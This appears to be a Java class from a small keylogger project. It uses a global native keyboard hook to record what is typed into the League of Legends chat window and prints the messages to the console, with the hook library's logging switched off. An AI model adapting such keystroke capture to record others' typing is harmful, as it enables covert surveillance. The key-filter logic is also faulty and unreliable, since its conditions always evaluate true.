package logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;

public class LolGameLogger extends KeyLogger implements NativeKeyListener {

    private static LolGameLogger ourInstance = new LolGameLogger();
    private boolean isLogging;

    private LolGameLogger() {
        baseMessage = "From: LoL-Game || At: " + getCurrentTime() + "|| Message: ";
        super.sendKey = "Enter";
    }

    public static LolGameLogger getInstance() {
        return ourInstance;
    }

    @Override
    void setDefaults() {
        baseMessage = "From: LoL-Game || At: " + getCurrentTime() + "|| Message: ";
        message = "";
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if (accessWindow.getActiveWindowTitle().equals(Globals.lolGame)) {
            if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals(sendKey)) {
                if (!isLogging) {
                    isLogging = true;
                } else {
                    saveMessage();
                    for (String s: log) {
                        System.out.println(s);
                    }
                    isLogging = false;
                }
            } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space")) {
                message = message + " ";
            } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Backspace")) {
                if (message.length() > 0) {
                    message = message.substring(0, message.length() - 1);
                }
            } else if(!NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Alt") ||
                      !NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Tab") ||
                      !NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Ctrl")) {
                if(isLogging) {
                    message = message + NativeKeyEvent.getKeyText(e.getKeyCode());
                }
            } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Escape")) {
                isLogging = false;
                message = "";
            }
        }
    }

    public void turnOn() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(getInstance());
        java.util.logging.Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
    }
}
